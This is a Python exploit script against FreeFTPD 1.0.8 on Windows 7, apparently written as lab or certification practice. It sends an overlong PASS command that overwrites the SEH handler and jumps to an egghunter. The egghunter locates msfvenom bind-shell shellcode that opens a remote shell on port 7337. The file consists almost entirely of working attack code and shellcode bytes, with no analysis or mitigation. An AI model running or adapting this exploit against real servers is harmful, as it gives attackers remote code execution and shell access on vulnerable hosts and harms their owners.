#!/usr/bin/python 
# FreeFTPD 1.0.8 on Windows 7 x86 SP1 
# NB: Need to create an "anonymous" user on the FTP server for this exploit to work 

import socket
import sys 

host = '192.168.1.114'
port = 21

#  msf-egghunter -e suls -f python (32)
egghunter =  ""
egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
egghunter += "\x05\x5a\x74\xef\xb8\x73\x75\x6c\x73\x89\xd7\xaf\x75"
egghunter += "\xea\xaf\x75\xe7\xff\xe7"

# root@kali:~/osce/EasyFtp# msfvenom -p windows/shell_bind_tcp -b "\x00\xcc" LPORT=7337 -f python EXITFUNC=seh (355 + 8 )
buf =  "sulssuls"
buf += "\xda\xd6\xd9\x74\x24\xf4\xbd\xf4\x07\xd7\x4b\x5a\x33"
buf += "\xc9\xb1\x53\x31\x6a\x17\x83\xc2\x04\x03\x9e\x14\x35"
buf += "\xbe\xa2\xf3\x3b\x41\x5a\x04\x5c\xcb\xbf\x35\x5c\xaf"
buf += "\xb4\x66\x6c\xbb\x98\x8a\x07\xe9\x08\x18\x65\x26\x3f"
buf += "\xa9\xc0\x10\x0e\x2a\x78\x60\x11\xa8\x83\xb5\xf1\x91"
buf += "\x4b\xc8\xf0\xd6\xb6\x21\xa0\x8f\xbd\x94\x54\xbb\x88"
buf += "\x24\xdf\xf7\x1d\x2d\x3c\x4f\x1f\x1c\x93\xdb\x46\xbe"
buf += "\x12\x0f\xf3\xf7\x0c\x4c\x3e\x41\xa7\xa6\xb4\x50\x61"
buf += "\xf7\x35\xfe\x4c\x37\xc4\xfe\x89\xf0\x37\x75\xe3\x02"
buf += "\xc5\x8e\x30\x78\x11\x1a\xa2\xda\xd2\xbc\x0e\xda\x37"
buf += "\x5a\xc5\xd0\xfc\x28\x81\xf4\x03\xfc\xba\x01\x8f\x03"
buf += "\x6c\x80\xcb\x27\xa8\xc8\x88\x46\xe9\xb4\x7f\x76\xe9"
buf += "\x16\xdf\xd2\x62\xba\x34\x6f\x29\xd3\xf9\x42\xd1\x23"
buf += "\x96\xd5\xa2\x11\x39\x4e\x2c\x1a\xb2\x48\xab\x5d\xe9"
buf += "\x2d\x23\xa0\x12\x4e\x6a\x67\x46\x1e\x04\x4e\xe7\xf5"
buf += "\xd4\x6f\x32\x63\xdc\xd6\xed\x96\x21\xa8\x5d\x17\x89"
buf += "\x41\xb4\x98\xf6\x72\xb7\x72\x9f\x1b\x4a\x7d\x83\x72"
buf += "\xc3\x9b\xd1\x94\x82\x34\x4d\x57\xf1\x8c\xea\xa8\xd3"
buf += "\xa4\x9c\xe1\x35\x72\xa3\xf1\x13\xd4\x33\x7a\x70\xe0"
buf += "\x22\x7d\x5d\x40\x33\xea\x2b\x01\x76\x8a\x2c\x08\xe0"
buf += "\x2f\xbe\xd7\xf0\x26\xa3\x4f\xa7\x6f\x15\x86\x2d\x82"
buf += "\x0c\x30\x53\x5f\xc8\x7b\xd7\x84\x29\x85\xd6\x49\x15"
buf += "\xa1\xc8\x97\x96\xed\xbc\x47\xc1\xbb\x6a\x2e\xbb\x0d"
buf += "\xc4\xf8\x10\xc4\x80\x7d\x5b\xd7\xd6\x81\xb6\xa1\x36"
buf += "\x33\x6f\xf4\x49\xfc\xe7\xf0\x32\xe0\x97\xff\xe9\xa0"
buf += "\xa6\x0e\x23\x3d\x3e\xa9\xd6\x7c\x22\x4a\x0d\x42\x5b"
buf += "\xc9\xa7\x3b\x98\xd1\xc2\x3e\xe4\x55\x3f\x33\x75\x30"
buf += "\x3f\xe0\x76\x11"

try: 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except:
    print("Socket() Failed")
    sys.exit(1) 

s.connect((host,port))
print(s.recv(1024))
s.send("USER anonymous\r\n")
print(s.recv(1024))
payload = "PASS "
payload += buf
payload += "A" * (797 - 40 - len(buf))
payload += "\x90\x90\x90\x90" + egghunter +"\x90\x90\x90\x90" 
payload += "\xeb\xd6\x90\x90" # JMP back to egghunter
payload += "\x17\x4f\x43"  # 0x00434f17 : pop ecx # pop ecx # ret  |  (C:\Program Files\freeFTPd\FreeFTPDService.exe)
payload += "\r\n" # Hopefully this is our null byte 
s.send(payload)
s.close() 